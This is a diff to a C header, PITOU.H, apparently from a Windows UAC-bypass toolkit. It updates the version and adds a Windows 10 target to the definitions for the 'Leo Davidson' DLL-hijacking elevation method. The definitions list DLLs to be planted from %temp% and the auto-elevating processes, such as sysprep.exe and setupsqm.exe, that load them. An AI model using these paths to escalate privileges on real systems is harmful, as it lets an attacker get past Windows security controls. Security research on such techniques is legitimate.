@@ -4,9 +4,9 @@
 *
 *  TITLE:       PITOU.H
 *
-*  VERSION:     1.70
+*  VERSION:     1.72
 *
-*  DATE:        24 Apr 2015
+*  DATE:        28 Apr 2015
 *
 *  Prototypes and definitions for Leo Davidson method.
 *
@@ -20,14 +20,15 @@
 //
 // Standard elevation methods.
 //
-#define M1W7_SOURCEDLL			L"%temp%\\CRYPTBASE.dll"
-#define M1W7_TARGETDIR			L"%systemroot%\\system32\\sysprep\\"
-#define M1W7_TARGETPROCESS		L"%systemroot%\\system32\\sysprep\\sysprep.exe"
-#define M1W8_SOURCEDLL			L"%temp%\\shcore.dll"
-#define M1WALL_SOURCEDLL		L"%temp%\\wdscore.dll"
-#define M1W7T_SOURCEDLL			L"%temp%\\ActionQueue.dll"
-#define M1WALL_TARGETDIR		L"%systemroot%\\system32\\oobe\\"
-#define M1WALL_TARGETPROCESS	L"%systemroot%\\system32\\oobe\\setupsqm.exe"
+#define M1W7_SOURCEDLL          L"%temp%\\CRYPTBASE.dll"
+#define M1W7_TARGETDIR          L"%systemroot%\\system32\\sysprep\\"
+#define M1W7_TARGETPROCESS      L"%systemroot%\\system32\\sysprep\\sysprep.exe"
+#define M1W8_SOURCEDLL          L"%temp%\\shcore.dll"
+#define M1WALL_SOURCEDLL        L"%temp%\\wdscore.dll"
+#define M1W7T_SOURCEDLL         L"%temp%\\ActionQueue.dll"
+#define M1W10_SOURCEDLL         L"%temp%\\iertutil.dll"
+#define M1WALL_TARGETDIR        L"%systemroot%\\system32\\oobe\\"
+#define M1WALL_TARGETPROCESS    L"%systemroot%\\system32\\oobe\\setupsqm.exe"
 
 BOOL ucmStandardAutoElevation(
 	DWORD dwType,
